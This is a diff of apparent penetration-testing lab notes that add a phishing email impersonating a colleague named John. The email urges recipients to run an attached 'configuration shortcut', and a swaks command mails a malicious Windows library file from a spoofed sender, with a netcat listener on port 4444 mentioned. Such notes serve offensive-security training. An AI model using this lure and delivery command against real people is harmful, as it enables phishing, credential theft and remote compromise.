@@ -33,10 +33,21 @@ Start nc at 4444
 ==============================================
 
 # Create a file body.txt with content.
+
+==============================================
+Hey!
+I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.
+
+On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+John
+==============================================
+
 # Send the email:
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.241.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 
-
+==============================================
+==============================================
 
 With this content:
 WTF: libraryDescription shows the namespace for the version of the library file format starting from Windows 7
